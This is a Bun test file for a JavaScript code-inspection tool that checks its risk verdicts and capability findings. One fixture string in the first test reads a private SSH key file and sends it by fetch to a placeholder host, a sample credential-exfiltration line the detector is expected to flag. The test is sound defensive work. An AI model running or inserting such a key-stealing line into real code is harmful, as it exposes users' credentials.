import { test, expect } from "bun:test";
import { inspect } from "../analyze/analyze";
import { renderHuman, verdict } from "./report";

test("exfil renders HIGH RISK with network and the named risk", () => {
  const code = `const fs = require('fs');\nconst k = fs.readFileSync('/h/.ssh/id_rsa');\nfetch('http://x/?k=' + k);`;
  const out = renderHuman(inspect(code, "x.js"), "x.js");
  expect(out).toContain("HIGH RISK");
  expect(out).toContain("EXFILTRATION");
  expect(out).toContain("NETWORK");
});

test("findings carry file:line evidence", () => {
  const r = inspect(`\nconst cp = require('child_process');`, "a.js");
  const f = r.findings.find((x) => x.capability === "EXEC");
  expect(f?.location.line).toBe(2);
});

test("benign module -> LIKELY SAFE, no capabilities line", () => {
  const r = inspect(`const _ = require('lodash');`, "b.js");
  expect(verdict(r)).toBe("LIKELY SAFE");
  expect(renderHuman(r, "b.js")).toContain("no capabilities");
});

test("eval -> REVIEW unverifiable", () => {
  const r = inspect(`eval(x);`, "c.js");
  expect(verdict(r)).toBe("REVIEW — unverifiable");
  expect(renderHuman(r, "c.js")).toContain("UNVERIFIABLE");
});

test("inspect output is JSON-serializable", () => {
  const json = JSON.stringify(inspect(`const https = require('https');`, "d.js"));
  expect(JSON.parse(json).capabilities).toContain("NETWORK");
});
